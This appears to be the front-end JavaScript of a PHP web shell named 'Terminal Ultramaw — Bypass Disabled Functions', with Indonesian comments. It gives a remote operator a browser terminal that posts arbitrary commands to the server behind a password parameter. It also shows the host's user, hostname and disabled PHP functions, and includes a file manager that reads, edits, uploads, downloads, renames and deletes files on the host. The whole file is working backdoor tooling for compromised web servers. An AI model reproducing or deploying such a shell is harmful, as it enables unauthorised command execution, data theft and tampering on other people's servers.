var termCwd='<?php echo addslashes($default_dir); ?>';
var termUser='<?php echo addslashes(get_current_user()); ?>';
var termHost='<?php echo addslashes(php_uname("n")); ?>';
var termHistory=[];
var termHistIdx=-1;

function termInit(){
    termPrint('info','Terminal Ultramaw — Bypass Disabled Functions');
    termPrint('info','Connected as '+termUser+'@'+termHost);
    var dis='<?php echo addslashes(implode(", ",array_filter(array_map("trim",explode(",",ini_get("disable_functions")))))); ?>';
    if(dis){termPrint('warn','Disabled functions: '+dis);}
    termPrint('info','Jangan Lupa Ngopi dan Mandi.\n');
}

function nav(page,el){
    document.querySelectorAll('.nav-item').forEach(function(n){n.classList.remove('active')});
    el.classList.add('active');
    document.querySelectorAll('.panel-section').forEach(function(s){s.classList.remove('active')});
    var t=document.getElementById('panel-'+page);
    if(t)t.classList.add('active');
    if(page==='terminal')document.getElementById('term-input').focus();
}

function termPrint(type,text){
    var body=document.getElementById('term-body');
    var div=document.createElement('div');
    div.className='term-out '+(type||'');
    div.textContent=text;
    body.appendChild(div);
    body.scrollTop=body.scrollHeight;
}

function termEcho(cmd){
    var body=document.getElementById('term-body');
    var div=document.createElement('div');
    div.className='term-line';
    div.innerHTML='<span class="term-prompt">'+escHtml(termUser+'@'+termHost+':'+termCwd.replace(/\/home\/[^/]+/,'~')+'$')+'</span><span class="term-cmd">'+escHtml(cmd)+'</span>';
    body.appendChild(div);
    body.scrollTop=body.scrollHeight;
}

function escHtml(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}

function clearTerm(){
    document.getElementById('term-body').innerHTML='';
    termPrint('info','Terminal cleared.');
}


function termKeydown(e){
    var input=document.getElementById('term-input');
    if(e.key==='Enter'){
        var cmd=input.value.trim();
        if(!cmd)return;
        termHistory.unshift(cmd);termHistIdx=-1;
        termEcho(cmd);
        input.value='';
        sendCmd(cmd);
    }else if(e.key==='ArrowUp'){
        e.preventDefault();
        if(termHistIdx<termHistory.length-1){termHistIdx++;input.value=termHistory[termHistIdx];}
    }else if(e.key==='ArrowDown'){
        e.preventDefault();
        if(termHistIdx>0){termHistIdx--;input.value=termHistory[termHistIdx];}
        else{termHistIdx=-1;input.value='';}
    }else if(e.key==='l'&&e.ctrlKey){
        e.preventDefault();clearTerm();
    }else if(e.key==='c'&&e.ctrlKey){
        termEcho(input.value+'^C');input.value='';
    }
}

function sendCmd(cmd){
    if(cmd==='clear'){clearTerm();return;}
    var xhr=new XMLHttpRequest();
    xhr.open('POST',window.location.href.split('?')[0]+'?ultra=<?php echo urlencode($access_password); ?>',true);
    xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
    xhr.onload=function(){
        try{
            var r=JSON.parse(xhr.responseText);
            if(r.output!==undefined&&r.output!==''){
                var outType=r.method==='blocked'?'err':'';
                r.output.split('\n').forEach(function(l){termPrint(outType,l);});
            }
            if(r.cwd){termCwd=r.cwd;updatePrompt();}
        }catch(e){
            termPrint('err','Parse error');
        }
        document.getElementById('term-body').scrollTop=99999;
    };
    xhr.onerror=function(){termPrint('err','Connection error');};
    xhr.send('term_cmd='+encodeURIComponent(cmd)+'&term_cwd='+encodeURIComponent(termCwd));
}

function updatePrompt(){
    var display=termCwd.replace(/\/home\/[^/]+/,'~');
    document.getElementById('term-prompt').textContent=termUser+'@'+termHost+':'+display+'$ ';
}

// ── FILE MANAGER ──
var fmCwd='<?php echo addslashes($default_dir); ?>';
var fmEditTarget='';
var fmPass='<?php echo urlencode($access_password); ?>';

function fmUrl(){
    return window.location.href.split('?')[0]+'?ultra='+fmPass;
}

// Bungkus string dalam single-quote aman untuk onclick attr
function fmQ(s){
    return "'" + String(s).replace(/\\/g,'\\\\').replace(/'/g,"\\'") + "'";
}

function fmLoad(dir){
    var go = dir || fmCwd;
    var tb = document.getElementById('fm-tbody');
    tb.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:24px;color:var(--color-text-tertiary);font-family:var(--mono);font-size:11px">&#8987; Loading...</td></tr>';
    var xhr = new XMLHttpRequest();
    xhr.open('POST', fmUrl(), true);
    xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
    xhr.onload = function(){
        try{
            var r = JSON.parse(xhr.responseText);
            if(r.success){
                fmCwd = r.cwd || go;
                fmBreadcrumb();
                fmRender(r.data);
            } else {
                tb.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:20px;color:var(--red);font-family:var(--mono);font-size:11px">&#10007; '+escHtml(r.msg||'Error')+'</td></tr>';
            }
        } catch(e){
            tb.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:20px;color:var(--red);font-family:var(--mono);font-size:11px">Parse error: '+escHtml(e.message)+'</td></tr>';
        }
    };
    xhr.onerror = function(){
        tb.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:20px;color:var(--red)">Connection error</td></tr>';
    };
    xhr.send('fm_action=list&dir='+encodeURIComponent(go));
}

function fmRender(files){
    var tb = document.getElementById('fm-tbody');
    if(!files || files.length === 0){
        tb.innerHTML = '<tr><td colspan="6"><div class="empty-state"><div class="empty-icon">&#128193;</div>Empty directory</div></td></tr>';
        return;
    }
    var EI = {php:'&#x1F418;',js:'&#x1F4DC;',css:'&#x1F3A8;',html:'&#x1F310;',htm:'&#x1F310;',json:'&#x1F4CB;',xml:'&#x1F4CB;',txt:'&#x1F4C4;',md:'&#x1F4DD;',log:'&#x1F4CB;',sh:'&#x2699;',py:'&#x1F40D;',jpg:'&#x1F5BC;',jpeg:'&#x1F5BC;',png:'&#x1F5BC;',gif:'&#x1F5BC;',svg:'&#x1F5BC;',zip:'&#x1F4E6;',tar:'&#x1F4E6;',gz:'&#x1F4E6;',sql:'&#x1F5C4;'};
    var html = '';
    for(var i = 0; i < files.length; i++){
        var f = files[i];
        var isDir = (f.type === 'dir');
        var isDot = (f.name === '..');
        var ext = (f.name.lastIndexOf('.') > 0 ? f.name.slice(f.name.lastIndexOf('.')+1) : '').toLowerCase();
        var icon = isDir ? '&#x1F4C1;' : (EI[ext] || '&#x1F4C4;');
        var nameCell;
        if(isDir){
            nameCell = '<a href="#" onclick="fmLoad('+fmQ(f.path)+');return false;" style="color:var(--green);text-decoration:none;font-family:var(--mono);font-size:11px">'+escHtml(f.name)+'</a>';
        } else {
            nameCell = '<span style="font-family:var(--mono);font-size:11px;color:var(--color-text-primary)">'+escHtml(f.name)+'</span>';
        }
        var act = '';
        if(!isDot){
            if(!isDir){
                act += '<button class="icon-btn" onclick="fmEdit('+fmQ(f.path)+','+fmQ(f.name)+')">Edit</button> ';
                act += '<a href="?ultra='+encodeURIComponent(fmPass)+'&fm_download='+encodeURIComponent(f.path)+'" class="icon-btn" style="text-decoration:none" target="_blank">Download</a> ';
            }
            act += '<button class="icon-btn" onclick="fmRenameFile('+fmQ(f.path)+','+fmQ(f.name)+')">Rename</button> ';
            act += '<button class="icon-btn red" onclick="fmDelete('+fmQ(f.path)+','+fmQ(f.name)+')">Delete</button>';
        }
        html += '<tr>';
        html += '<td style="font-size:15px;text-align:center;padding:5px 8px">'+icon+'</td>';
        html += '<td class="td-primary">'+nameCell+'</td>';
        html += '<td class="td-mono" style="color:var(--color-text-tertiary)">'+escHtml(f.size)+'</td>';
        html += '<td class="td-mono" style="color:var(--color-text-tertiary);font-size:10px">'+escHtml(f.perms)+'</td>';
        html += '<td class="td-mono" style="color:var(--color-text-tertiary);font-size:10px">'+escHtml(f.mtime)+'</td>';
        html += '<td style="text-align:right;white-space:nowrap">'+act+'</td>';
        html += '</tr>';
    }
    tb.innerHTML = html;
}

function fmBreadcrumb(){
    var parts = fmCwd.replace(/\\/g,'/').split('/').filter(function(p){ return p !== ''; });
    var bc = document.getElementById('fm-breadcrumb');
    var sep = '<span style="color:var(--color-text-tertiary);margin:0 1px">/</span>';
    var html = '<span onclick="fmLoad(\'\'/\''+'\')" style="cursor:pointer;color:var(--color-text-secondary)">'+sep+'</span>';
    var path = '';
    for(var i = 0; i < parts.length; i++){
        path += '/'+parts[i];
        var cur = path;
        if(i < parts.length - 1){
            html += '<span onclick="fmLoad('+fmQ(cur)+')" style="cursor:pointer;color:var(--color-text-secondary)">'+escHtml(parts[i])+'</span>'+sep;
        } else {
            html += '<span style="color:var(--color-text-primary);font-weight:500">'+escHtml(parts[i])+'</span>';
        }
    }
    bc.innerHTML = html;
}

function fmEdit(path, name){
    fmEditTarget = path;
    document.getElementById('fm-modal-title').textContent = 'Editing: '+name;
    document.getElementById('fm-editor').value = 'Loading...';
    document.getElementById('fm-modal').style.display = 'flex';
    var xhr = new XMLHttpRequest();
    xhr.open('POST', fmUrl(), true);
    xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
    xhr.onload = function(){
        try{
            var r = JSON.parse(xhr.responseText);
            document.getElementById('fm-editor').value = r.success ? r.data : ('// Error: '+r.msg);
        } catch(e){ document.getElementById('fm-editor').value = '// Parse error'; }
    };
    xhr.send('fm_action=read&target='+encodeURIComponent(path));
}

function fmSaveFile(){
    var content = document.getElementById('fm-editor').value;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', fmUrl(), true);
    xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
    xhr.onload = function(){
        try{
            var r = JSON.parse(xhr.responseText);
            if(r.success){ toast('success','&#10003; File saved'); }
            else { toast('error', r.msg || 'Save failed'); }
        } catch(e){ toast('error','Parse error'); }
    };
    xhr.send('fm_action=save&target='+encodeURIComponent(fmEditTarget)+'&content='+encodeURIComponent(content));
}

function fmCloseModal(){
    document.getElementById('fm-modal').style.display = 'none';
    fmEditTarget = '';
}

function fmDelete(path, name){
    if(!confirm('Hapus "'+name+'"?\nTidak bisa dibatalkan!')) return;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', fmUrl(), true);
    xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
    xhr.onload = function(){
        try{
            var r = JSON.parse(xhr.responseText);
            if(r.success){ toast('success','"'+name+'" deleted'); fmLoad(fmCwd); }
            else { toast('error', r.msg || 'Delete failed'); }
        } catch(e){ toast('error','Parse error'); }
    };
    xhr.send('fm_action=delete&target='+encodeURIComponent(path));
}

function fmRenameFile(path, name){
    var n = prompt('Rename "'+name+'" menjadi:', name);
    if(!n || n === name) return;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', fmUrl(), true);
    xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
    xhr.onload = function(){
        try{
            var r = JSON.parse(xhr.responseText);
            if(r.success){ toast('success','Renamed \u2192 "'+n+'"'); fmLoad(fmCwd); }
            else { toast('error', r.msg || 'Rename failed'); }
        } catch(e){ toast('error','Parse error'); }
    };
    xhr.send('fm_action=rename&target='+encodeURIComponent(path)+'&name='+encodeURIComponent(n));
}

function fmMkdir(){
    var n = prompt('Nama folder baru:');
    if(!n) return;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', fmUrl(), true);
    xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
    xhr.onload = function(){
        try{
            var r = JSON.parse(xhr.responseText);
            if(r.success){ toast('success','Folder "'+n+'" dibuat'); fmLoad(fmCwd); }
            else { toast('error', r.msg || 'Gagal buat folder'); }
        } catch(e){ toast('error','Parse error'); }
    };
    xhr.send('fm_action=mkdir&dir='+encodeURIComponent(fmCwd)+'&name='+encodeURIComponent(n));
}

function fmMkfile(){
    var n = prompt('Nama file baru:');
    if(!n) return;
    var p = fmCwd.replace(/\/$/,'') + '/' + n;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', fmUrl(), true);
    xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
    xhr.onload = function(){
        try{
            var r = JSON.parse(xhr.responseText);
            if(r.success){ toast('success','File "'+n+'" dibuat'); fmLoad(fmCwd); }
            else { toast('error', r.msg || 'Gagal buat file'); }
        } catch(e){ toast('error','Parse error'); }
    };
    xhr.send('fm_action=save&target='+encodeURIComponent(p)+'&content=');
}

function fmUpload(input){
    if(!input.files || !input.files[0]) return;
    var file = input.files[0];
    var fd = new FormData();
    fd.append('fm_action','upload');
    fd.append('dir', fmCwd);
    fd.append('file', file);
    toast('success','Uploading "'+file.name+'"...');
    var xhr = new XMLHttpRequest();
    xhr.open('POST', fmUrl(), true);
    xhr.onload = function(){
        try{
            var r = JSON.parse(xhr.responseText);
            if(r.success){ toast('success','"'+file.name+'" uploaded'); fmLoad(fmCwd); }
            else { toast('error', r.msg || 'Upload failed'); }
        } catch(e){ toast('error','Parse error'); }
        input.value = '';
    };
    xhr.onerror = function(){ toast('error','Upload connection error'); input.value = ''; };
    xhr.send(fd);
}

// Ctrl+S untuk save di editor
document.addEventListener('keydown', function(e){
    if((e.ctrlKey || e.metaKey) && e.key === 's'){
        var modal = document.getElementById('fm-modal');
        if(modal && modal.style.display === 'flex'){ e.preventDefault(); fmSaveFile(); }
    }
});
</script>

</body>
</html>
